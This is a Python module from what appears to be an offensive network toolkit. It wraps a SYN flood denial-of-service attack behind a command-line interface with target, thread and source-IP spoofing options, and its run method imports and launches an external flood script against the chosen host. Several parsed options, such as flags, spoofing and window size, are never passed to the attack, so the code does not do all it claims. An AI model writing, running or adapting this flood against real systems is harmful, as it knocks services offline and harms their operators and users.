"""SYN Flood attack implementation"""

import argparse
import sys
import os
import netifaces
from typing import Optional, Dict, Any
import logging

from .base import AttackBase

logger = logging.getLogger(__name__)

class SynFlood(AttackBase):
    """SYN Flood attack implementation"""
    
    name = "syn-flood"
    description = "Perform SYN flood attack"
    
    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        # Target configuration
        target_group = parser.add_argument_group('Target Configuration')
        target_group.add_argument('--target', required=True, help='Target IP address')
        target_group.add_argument('--port', type=int, required=True, help='Target port')
        target_group.add_argument('--port-range', help='Port range to attack (e.g., 80-85)')
        
        # Network configuration
        net_group = parser.add_argument_group('Network Configuration')
        net_group.add_argument('--interface', help='Network interface to use')
        net_group.add_argument('--source-ip', help='Source IP address for packets (random if not specified)')
        net_group.add_argument('--source-port', type=int, help='Source port for packets (random if not specified)')
        net_group.add_argument('--randomize-source', action='store_true', help='Randomize source IP for each packet')
        
        # Attack behavior
        behavior_group = parser.add_argument_group('Attack Behavior')
        behavior_group.add_argument('--count', type=int, default=1000, help='Number of packets to send')
        behavior_group.add_argument('--interval', type=float, default=0.1, help='Time interval between packets (seconds)')
        behavior_group.add_argument('--threads', type=int, default=1, help='Number of threads to use')
        behavior_group.add_argument('--payload-size', type=int, default=0, help='Additional payload size in bytes')
        behavior_group.add_argument('--window-size', type=int, default=8192, help='TCP window size')
        behavior_group.add_argument('--flags', default='S', help='TCP flags (S=SYN, A=ACK, F=FIN, R=RST, P=PSH)')
        
        # Monitoring and output
        monitor_group = parser.add_argument_group('Monitoring')
        monitor_group.add_argument('--packet-log', help='Log file for sent packets')
        monitor_group.add_argument('--stats-interval', type=float, default=1.0, help='Interval for printing statistics')
        monitor_group.add_argument('--silent', action='store_true', help='Suppress non-error output')
        
    def validate(self, args: argparse.Namespace) -> bool:
        # Validate target IP and port
        if not self.validator.validate_ip(args.target, allow_private=True, allow_loopback=False):
            logger.error(f"Invalid target IP address: {args.target}")
            return False
            
        if args.port_range:
            try:
                start_port, end_port = map(int, args.port_range.split('-'))
                if not all(self.validator.validate_port(p) for p in [start_port, end_port]):
                    logger.error(f"Invalid port range: {args.port_range}")
                    return False
                if start_port >= end_port:
                    logger.error(f"Invalid port range: start port must be less than end port")
                    return False
            except ValueError:
                logger.error(f"Invalid port range format. Use start-end (e.g., 80-85)")
                return False
        else:
            if not self.validator.validate_port(args.port):
                logger.error(f"Invalid port number: {args.port}")
                return False
        
        # Validate source IP if provided
        if args.source_ip and not self.validator.validate_ip(args.source_ip):
            logger.error(f"Invalid source IP address: {args.source_ip}")
            return False
            
        # Validate source port if provided
        if args.source_port and not self.validator.validate_port(args.source_port):
            logger.error(f"Invalid source port: {args.source_port}")
            return False
            
        # Validate interface if provided
        if args.interface and not self.validator.validate_interface(args.interface):
            logger.error(f"Invalid interface: {args.interface}")
            return False
            
        # Validate packet log file if specified
        if args.packet_log and not self.validator.validate_file_path(
            args.packet_log,
            check_exists=False,
            check_readable=False
        ):
            logger.error(f"Invalid packet log file path: {args.packet_log}")
            return False
            
        # Validate numeric parameters
        if args.count <= 0:
            logger.error(f"Invalid packet count: {args.count}")
            return False
        if args.interval <= 0:
            logger.error(f"Invalid interval: {args.interval}")
            return False
        if args.threads <= 0:
            logger.error(f"Invalid thread count: {args.threads}")
            return False
        if args.payload_size < 0:
            logger.error(f"Invalid payload size: {args.payload_size}")
            return False
        if args.window_size <= 0:
            logger.error(f"Invalid window size: {args.window_size}")
            return False
        if args.stats_interval <= 0:
            logger.error(f"Invalid statistics interval: {args.stats_interval}")
            return False
            
        # Validate TCP flags
        valid_flags = set('SAFRP')
        if not all(f in valid_flags for f in args.flags.upper()):
            logger.error(f"Invalid TCP flags: {args.flags}")
            return False
            
        return True
        
    def run(self, args: argparse.Namespace) -> None:
        # Import the original attack script
        scripts_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'scripts')
        syn_flood_path = os.path.join(scripts_dir, 'syn_flood')
        
        sys.path.insert(0, syn_flood_path)
        try:
            import syn_flood as attack_script
            
            # Create attack configuration
            config = {
                'target_ip': args.target,
                'target_port': args.port,
                'packet_count': args.count,
                'interval': args.interval,
                'thread_count': args.threads
            }
            
            # Run the attack
            logger.info(f"Running SYN flood attack against {args.target}:{args.port}")
            attack_script.run_attack(config)
            
        except ImportError:
            logger.error("Failed to import SYN flood attack script")
            raise
        except Exception as e:
            logger.error(f"Attack failed: {str(e)}")
            raise
        finally:
            sys.path.remove(syn_flood_path)
